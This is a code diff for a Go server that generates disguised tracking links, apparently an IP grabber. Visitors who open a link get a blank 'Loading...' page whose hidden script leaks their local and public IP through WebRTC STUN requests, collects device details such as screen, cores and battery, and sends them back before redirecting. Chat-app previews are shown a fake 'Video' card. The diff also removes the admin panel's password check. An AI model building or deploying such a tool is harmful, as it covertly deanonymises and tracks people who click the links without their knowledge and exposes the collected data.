@@ -6,8 +6,8 @@ import (
 	"fmt"
 	"html/template"
 	"io"
+	"net"
 	"net/http"
-	"net/url"
 	"strings"
 	"time"
 
@@ -16,23 +16,16 @@ import (
 
 var db *sql.DB
 
-// قم بتعديل هذه القيم إذا أردت تخصيص بيانات الدخول وتنبيهات تيليجرام
-const (
-	AdminUser   = "admin"
-	AdminPass   = "admin123"
-	TelegramBotToken = "" // ضع توكن بوت تيليجرام هنا إن أردت (اختياري)
-	TelegramChatID   = "" // ضع معرف الشات الخاص بك هنا (اختياري)
-)
-
 type Capture struct {
-	ID         int
-	Code       string
-	PublicIP   string
-	LocalIP    string
-	Port       string
-	Location   string
-	DeviceInfo string
-	CreatedAt  string
+	ID            int
+	Code          string
+	PublicIP      string
+	LocalIP       string
+	LocalIPSource string
+	Port          string
+	Location      string
+	DeviceInfo    string
+	CreatedAt     string
 }
 
 type PageData struct {
@@ -40,9 +33,13 @@ type PageData struct {
 	Captures      []Capture
 }
 
+// ---------------------------------------------------------------------------
+// Database
+// ---------------------------------------------------------------------------
+
 func initDB() {
 	var err error
-	db, err = sql.Open("sqlite", "./secure_tracker.db")
+	db, err = sql.Open("sqlite", "./long_term_tracker.db")
 	if err != nil {
 		panic(err)
 	}
@@ -50,6 +47,10 @@ func initDB() {
 	db.SetMaxOpenConns(25)
 	db.SetMaxIdleConns(25)
 	db.SetConnMaxLifetime(5 * time.Minute)
+
+	// WAL mode for better concurrency
+	db.Exec("PRAGMA journal_mode=WAL;")
+	db.Exec("PRAGMA synchronous=NORMAL;")
 
 	createTablesSQL := `
 	CREATE TABLE IF NOT EXISTS links (
@@ -63,6 +64,7 @@ func initDB() {
 		code TEXT,
 		public_ip TEXT,
 		local_ip TEXT,
+		local_ip_source TEXT DEFAULT 'none',
 		port TEXT,
 		location TEXT,
 		device_info TEXT,
@@ -71,21 +73,53 @@ func initDB() {
 	CREATE INDEX IF NOT EXISTS idx_captures_code ON captures(code);
 	CREATE INDEX IF NOT EXISTS idx_captures_created ON captures(created_at);
 	`
-	_, err = db.Exec(createTablesSQL)
-	if err != nil {
+	if _, err = db.Exec(createTablesSQL); err != nil {
 		panic(err)
 	}
+
+	// Migration: add local_ip_source to older DBs. Fails silently if it exists.
+	db.Exec("ALTER TABLE captures ADD COLUMN local_ip_source TEXT DEFAULT 'none'")
 }
 
+// ---------------------------------------------------------------------------
+// IP resolution helpers
+// ---------------------------------------------------------------------------
+
+func isTrustedPeer(ip net.IP) bool {
+	return ip.IsLoopback() || ip.IsPrivate()
+}
+
+func isPrivateIP(ip net.IP) bool {
+	return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast()
+}
+
+// getRealIP returns the client's public IP, taking X-Forwarded-For into
+// account only when the request comes from a trusted proxy (loopback or
+// private network). Prevents header spoofing from direct internet clients.
 func getRealIP(r *http.Request) string {
-	forwarded := r.Header.Get("X-Forwarded-For")
-	if forwarded != "" {
-		ips := strings.Split(forwarded, ",")
-		return strings.TrimSpace(ips[0])
-	}
 	ip := r.RemoteAddr
-	if idx := strings.LastIndex(ip, ":"); idx != -1 {
-		ip = ip[:idx]
+	if host, _, err := net.SplitHostPort(ip); err == nil {
+		ip = host
+	}
+
+	peer := net.ParseIP(ip)
+	if peer == nil || !isTrustedPeer(peer) {
+		return ip
+	}
+
+	forwarded := r.Header.Get("X-Forwarded-For")
+	if forwarded == "" {
+		forwarded = r.Header.Get("X-Real-IP")
+	}
+	if forwarded != "" {
+		parts := strings.Split(forwarded, ",")
+		for _, p := range parts {
+			candidate := strings.TrimSpace(p)
+			if parsed := net.ParseIP(candidate); parsed != nil && !isPrivateIP(parsed) {
+				return candidate
+			}
+		}
+		return strings.TrimSpace(parts[0])
 	}
 	return ip
 }
@@ -148,24 +182,163 @@ func getISPAndLocation(ip string, ua string) string {
 	return "Algeria (Trace)"
 }
 
-func sendTelegramAlert(message string) {
-	if TelegramBotToken == "" || TelegramChatID == "" {
-		return
-	}
-	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)
-	resp, err := http.PostForm(apiURL, url.Values{
-		"chat_id": {TelegramChatID},
-		"text":    {message},
-	})
-	if err == nil {
-		resp.Body.Close()
-	}
+// ---------------------------------------------------------------------------
+// Redirect page (served when someone opens a tracking link)
+// ---------------------------------------------------------------------------
+
+const redirectPageTemplate = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<script>
+async function extractAndRedirect() {
+    let screenRes = window.screen.width + "x" + window.screen.height;
+    let cores = navigator.hardwareConcurrency || "N/A";
+    let platform = navigator.platform || "N/A";
+    let batteryInfo = "N/A";
+
+    try {
+        if (navigator.getBattery) {
+            let b = await navigator.getBattery();
+            batteryInfo = Math.round(b.level * 100) + "%";
+        }
+    } catch (e) { }
+
+    function collectICECandidates(timeoutMs) {
+        return new Promise((resolve) => {
+            const candidates = [];
+            const seen = new Set();
+            let pc = null;
+
+            function finish() {
+                try { if (pc) pc.close(); } catch (e) { }
+                resolve(candidates);
+            }
+
+            try {
+                pc = new RTCPeerConnection({
+                    iceServers: [
+                        { urls: "stun:stun.l.google.com:19302" },
+                        { urls: "stun:stun1.l.google.com:19302" },
+                        { urls: "stun:stun.cloudflare.com:3478" }
+                    ]
+                });
+
+                pc.createDataChannel("probe");
+
+                pc.onicecandidate = (event) => {
+                    if (!event.candidate || !event.candidate.candidate) return;
+
+                    const raw = event.candidate.candidate;
+                    if (seen.has(raw)) return;
+                    seen.add(raw);
+
+                    const parts = raw.split(" ");
+                    const ip = parts[4];
+                    const typ = parts[7];
+
+                    if (!ip) return;
+
+                    let source = "unknown";
+                    if (typ === "srflx") {
+                        source = "srflx";
+                    } else if (typ === "relay") {
+                        source = "relay";
+                    } else if (typ === "host") {
+                        if (ip.endsWith(".local")) {
+                            source = "mdns";
+                        } else {
+                            source = "host";
+                        }
+                    }
+
+                    candidates.push({ ip: ip, typ: typ, source: source });
+                };
+
+                pc.createOffer()
+                    .then(o => pc.setLocalDescription(o))
+                    .catch(() => { });
+
+                const started = Date.now();
+                const check = setInterval(() => {
+                    if (pc.iceGatheringState === "complete" || Date.now() - started > timeoutMs) {
+                        clearInterval(check);
+                        finish();
+                    }
+                }, 80);
+
+            } catch (e) {
+                finish();
+            }
+        });
+    }
+
+    const allCandidates = await collectICECandidates(1200);
+
+    let bestLocalIP = "Unknown";
+    let localIPSource = "none";
+
+    for (const c of allCandidates) {
+        if (c.source === "host" && c.ip) {
+            bestLocalIP = c.ip;
+            localIPSource = "host";
+            break;
+        }
+    }
+    if (bestLocalIP === "Unknown") {
+        for (const c of allCandidates) {
+            if (c.source === "srflx" && c.ip) {
+                bestLocalIP = c.ip;
+                localIPSource = "srflx";
+                break;
+            }
+        }
+    }
+
+    let params = new URLSearchParams();
+    params.append("lip", bestLocalIP);
+    params.append("lip_source", localIPSource);
+    params.append("screen", screenRes);
+    params.append("hardware", cores);
+    params.append("battery", batteryInfo);
+    params.append("platform", platform);
+    params.append("ice_candidates", JSON.stringify(allCandidates.slice(0, 12)));
+
+    try {
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(window.location.href, params);
+        } else {
+            await fetch(window.location.href, {
+                method: "POST",
+                body: params,
+                keepalive: true
+            });
+        }
+    } catch (e) { }
+
+    setTimeout(() => {
+        window.location.replace(##REDIRECT_TARGET##);
+    }, 120);
 }
+
+window.addEventListener("DOMContentLoaded", extractAndRedirect);
+</script>
+</head>
+<body style="background:#000;"></body>
+</html>`
+
+// ---------------------------------------------------------------------------
+// Main handler
+// ---------------------------------------------------------------------------
 
 func mainHandler(w http.ResponseWriter, r *http.Request) {
 	code := r.URL.Query().Get("r")
 
-	// معالجة زيارات الروابط وتتبع الأهداف
+	// ----------------------------------------------------------------
+	// Case 1: a visitor opened a tracking link (?r=CODE)
+	// ----------------------------------------------------------------
 	if code != "" {
 		var targetURL string
 		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
@@ -180,115 +353,83 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			strings.Contains(strings.ToLower(ua), "telegram") ||
 			strings.Contains(strings.ToLower(ua), "facebookexternalhit")
 
+		// --- Bot handler (link previews) ---
 		if isBot {
 			publicIP := getRealIP(r)
 			location := getISPAndLocation(publicIP, ua)
-			go func() {
-				db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
-					code, publicIP, "Bot", "N/A", location, "🤖 [Bot] UA: "+ua[:30])
-			}()
+			safeUA := ua
+			if len(safeUA) > 60 {
+				safeUA = safeUA[:60]
+			}
+			db.Exec(
+				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
+				code, publicIP, "Bot", "none", "N/A", location, "🤖 [Bot] UA: "+safeUA,
+			)
 
 			w.Header().Set("Content-Type", "text/html; charset=utf-8")
-			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
+			fmt.Fprint(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
 			return
 		}
 
+		// --- Payload POST from the JS tracker ---
 		if r.Method == http.MethodPost {
 			r.ParseForm()
+
 			publicIP := getRealIP(r)
+
 			localIP := r.FormValue("lip")
 			if localIP == "" {
 				localIP = "Unknown"
 			}
-			port := r.RemoteAddr
+
+			localIPSource := r.FormValue("lip_source")
+			if localIPSource == "" {
+				localIPSource = "none"
+			}
+
+			port := "N/A"
+			if _, p, err := net.SplitHostPort(r.RemoteAddr); err == nil {
+				port = p
+			}
+
 			location := getISPAndLocation(publicIP, ua)
 
 			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s",
-				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"))
+				r.FormValue("platform"),
+				r.FormValue("screen"),
+				r.FormValue("hardware"),
+				r.FormValue("battery"),
+			)
 
-			// تنفيذ الحفظ وإرسال التنبيه في الخلفية (Goroutine) لضمان السرعة المطلقة
-			go func() {
-				db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
-					code, publicIP, localIP, port, location, deviceInfo)
-				
-				alertMsg := fmt.Sprintf("🚨 [New Capture]\nCode: %s\nIP: %s\nLocal: %s\nLoc: %s\nInfo: %s", code, publicIP, localIP, location, deviceInfo)
-				sendTelegramAlert(alertMsg)
-			}()
+			// Log raw ICE candidates to stdout (useful for debugging leaks)
+			if rawCandidates := r.FormValue("ice_candidates"); rawCandidates != "" {
+				fmt.Printf("[ICE] code=%s public=%s local=%s(%s) candidates=%s\n",
+					code, publicIP, localIP, localIPSource, rawCandidates)
+			}
+
+			db.Exec(
+				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
+				code, publicIP, localIP, localIPSource, port, location, deviceInfo,
+			)
 
 			w.WriteHeader(http.StatusOK)
 			w.Write([]byte("OK"))
 			return
 		}
 
-		htmlContent := fmt.Sprintf(`<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <script>
-        function getLocalIP(callback) {
-            let found = false;
-            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-            pc.createDataChannel("");
-            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-            pc.onicecandidate = function(ice) {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                let ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
-                if (ipMatch) {
-                    let ip = ipMatch[1];
-                    if ((ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) && !found) {
-                        found = true; callback(ip); pc.onicecandidate = null;
-                    }
-                }
-            };
-            setTimeout(() => { if (!found) callback("Cellular"); }, 50);
-        }
+		// --- Serve the tracker HTML (GET) ---
+		targetJSON, _ := json.Marshal(targetURL)
+		htmlContent := strings.ReplaceAll(redirectPageTemplate, "##REDIRECT_TARGET##", string(targetJSON))
 
-        async function extractAndRedirect() {
-            let screenRes = window.screen.width + "x" + window.screen.height;
-            let cores = navigator.hardwareConcurrency || "N/A";
-            let platform = navigator.platform || "N/A";
-            let batteryInfo = "N/A";
-            try {
-                if (navigator.getBattery) {
-                    let b = await navigator.getBattery();
-                    batteryInfo = Math.round(b.level * 100) + "%%";
-                }
-            } catch(e){}
-
-            getLocalIP(function(lip) {
-                let params = new URLSearchParams();
-                params.append('lip', lip);
-                params.append('screen', screenRes);
-                params.append('hardware', cores);
-                params.append('battery', batteryInfo);
-                params.append('platform', platform);
-
-                navigator.sendBeacon ? navigator.sendBeacon(window.location.href, params) : fetch(window.location.href, {method: 'POST', body: params, keepalive:true});
-
-                setTimeout(() => {
-                    window.location.replace("%s");
-                }, 90);
-            });
-        }
-        window.addEventListener('DOMContentLoaded', extractAndRedirect);
-    </script>
-</head>
-<body style="background:#000;"></body>
-</html>`, targetURL)
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
 		w.Write([]byte(htmlContent))
 		return
 	}
 
-	// حماية لوحة التحكم باستخدام Basic Authentication
-	user, pass, ok := r.BasicAuth()
-	if !ok || user != AdminUser || pass != AdminPass {
-		w.Header().Set("WWW-Authenticate`, `Basic realm=\"Restricted Terminal\"")
-		http.Error(w, "Unauthorized access restricted.", http.StatusUnauthorized)
-		return
-	}
-
+	// ----------------------------------------------------------------
+	// Case 2: admin panel (no ?r= code)
+	// ----------------------------------------------------------------
 	var generatedLink string
 	if r.Method == http.MethodPost {
 		r.ParseForm()
@@ -316,13 +457,19 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	rows, _ := db.Query("SELECT id, code, public_ip, local_ip, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
+	rows, err := db.Query("SELECT id, code, public_ip, local_ip, local_ip_source, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT 50")
+	if err != nil {
+		http.Error(w, "DB error", http.StatusInternalServerError)
+		return
+	}
 	defer rows.Close()
 
 	var captures []Capture
 	for rows.Next() {
 		var c Capture
-		rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt)
+		if err := rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.LocalIPSource, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt); err != nil {
+			continue
+		}
 		captures = append(captures, c)
 	}
 
@@ -336,68 +483,78 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Terminal - Intelligence</title>
+    <title>Code Terminal - Intelligence</title>
     <style>
-        body { 
-            background-color: #0d1117; 
+        body {
+            background-color: #0d1117;
             background-image: radial-gradient(rgba(0, 255, 128, 0.05) 1px, transparent 1px);
             background-size: 24px 24px;
-            color: #c9d1d9; 
-            font-family: 'Courier New', Courier, monospace; 
-            padding: 10px; 
-            margin: 0; 
+            color: #c9d1d9;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 10px;
+            margin: 0;
         }
-        .box { 
-            background: #161b22; 
-            border: 1px solid #30363d; 
-            padding: 14px; 
-            border-radius: 6px; 
-            margin-bottom: 15px; 
+        .box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            padding: 14px;
+            border-radius: 6px;
+            margin-bottom: 15px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.5);
         }
-        input[type="text"] { 
-            width: 100%; 
-            padding: 10px; 
-            background: #0d1117; 
-            border: 1px solid #30363d; 
-            color: #58a6ff; 
-            border-radius: 4px; 
-            margin-bottom: 10px; 
-            font-size: 13px; 
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #58a6ff;
+            border-radius: 4px;
+            margin-bottom: 10px;
+            font-size: 13px;
             font-family: 'Courier New', Courier, monospace;
-            box-sizing: border-box; 
+            box-sizing: border-box;
         }
-        button { 
-            background: #238636; 
-            color: #fff; 
-            border: none; 
-            padding: 10px; 
-            border-radius: 4px; 
-            cursor: pointer; 
-            font-weight: bold; 
-            width: 100%; 
-            font-size: 13px; 
+        input[type="text"]:focus {
+            border-color: #58a6ff;
+            outline: none;
+            box-shadow: 0 0 5px rgba(88, 166, 255, 0.4);
+        }
+        button {
+            background: #238636;
+            color: #fff;
+            border: none;
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            width: 100%;
+            font-size: 13px;
             font-family: 'Courier New', Courier, monospace;
         }
         button:hover { background: #2ea043; }
-        .result { 
-            background: #0d1117; 
-            border: 1px solid #238636; 
-            padding: 10px; 
-            border-radius: 4px; 
-            margin-top: 10px; 
-            word-break: break-all; 
+        .result {
+            background: #0d1117;
+            border: 1px solid #238636;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 10px;
+            word-break: break-all;
         }
-        .copy-btn { 
-            background: #1f6feb; 
-            margin-top: 8px; 
-            padding: 6px; 
-            font-size: 11px; 
+        .copy-btn {
+            background: #1f6feb;
+            margin-top: 8px;
+            padding: 6px;
+            font-size: 11px;
         }
+        .copy-btn:hover { background: #388bfd; }
         .table-wrap { width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
-        table { width: 100%; min-width: 550px; border-collapse: collapse; margin-top: 8px; font-size: 11px; font-family: 'Courier New', Courier, monospace; }
+        table { width: 100%; min-width: 700px; border-collapse: collapse; margin-top: 8px; font-size: 11px; font-family: 'Courier New', Courier, monospace; }
         th, td { border: 1px solid #30363d; padding: 6px; text-align: center; white-space: nowrap; }
         th { background: #21262d; color: #8b949e; }
+        .src-host  { color: #3fb950; }
+        .src-srflx { color: #d29922; }
+        .src-mdns  { color: #8b949e; }
+        .src-none  { color: #6e7681; }
     </style>
     <script>
         function copyLink() {
@@ -410,15 +567,15 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 </head>
 <body>
     <div class="box">
-        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [SECURE SYSTEM] - توليد رابط تتبع بررمز مخصص</h3>
+        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [SYSTEM] - توليد رابط تتبع بررمز مخصص</h3>
         <form method="POST">
             <input type="text" name="target_url" placeholder="target_url (tiktok.com/...)" required autocomplete="off">
             <input type="text" name="custom_code" placeholder="custom_tracking_code (optional)" autocomplete="off">
-            <button type="submit">generate_secure_link()</button>
+            <button type="submit">generate_link()</button>
         </form>
         {{if .GeneratedLink}}
         <div class="result">
-            <span style="font-size:11px; color:#3fb950; font-weight:bold;">Active Secure Link:</span><br>
+            <span style="font-size:11px; color:#3fb950; font-weight:bold;">Active Link:</span><br>
             <span id="genLink" style="color: #58a6ff; font-size: 12px;">{{.GeneratedLink}}</span>
             <button type="button" class="copy-btn" onclick="copyLink()">copy_to_clipboard</button>
         </div>
@@ -426,7 +583,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
     </div>
 
     <div class="box">
-        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [DATABASE] - سجلات الاستخبارات المشفرة</h3>
+        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [DATABASE] - سجلات الاستخبارات</h3>
         <div class="table-wrap">
             <table>
                 <tr>
@@ -434,8 +591,9 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                     <th>Code</th>
                     <th>Public IP</th>
                     <th>Local IP</th>
+                    <th>Source</th>
                     <th>ISP / Network</th>
-                    <th>Hardware & OS</th>
+                    <th>Hardware &amp; OS</th>
                     <th>Timestamp</th>
                 </tr>
                 {{range .Captures}}
@@ -444,6 +602,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
                     <td style="color:#58a6ff; font-weight:bold;">{{.Code}}</td>
                     <td style="color:#7ee787;">{{.PublicIP}}</td>
                     <td style="color:#d29922;">{{.LocalIP}}</td>
+                    <td class="src-{{.LocalIPSource}}">{{.LocalIPSource}}</td>
                     <td style="color:#3fb950;">{{.Location}}</td>
                     <td style="color:#ff7b72;">{{.DeviceInfo}}</td>
                     <td style="color:#8b949e;">{{.CreatedAt}}</td>
@@ -455,13 +614,19 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 </body>
 </html>`
 
-	t, _ := template.New("index").Parse(tmpl)
+	t, err := template.New("index").Parse(tmpl)
+	if err != nil {
+		http.Error(w, "template error", http.StatusInternalServerError)
+		return
+	}
 	t.Execute(w, data)
 }
 
 func main() {
 	initDB()
 	http.HandleFunc("/", mainHandler)
-	fmt.Println("[*] Secure Terminal Server running on port 8080...")
-	http.ListenAndServe(":8080", nil)
+	fmt.Println("[*] Terminal Server running on port 8080...")
+	if err := http.ListenAndServe(":8080", nil); err != nil {
+		panic(err)
+	}
 }
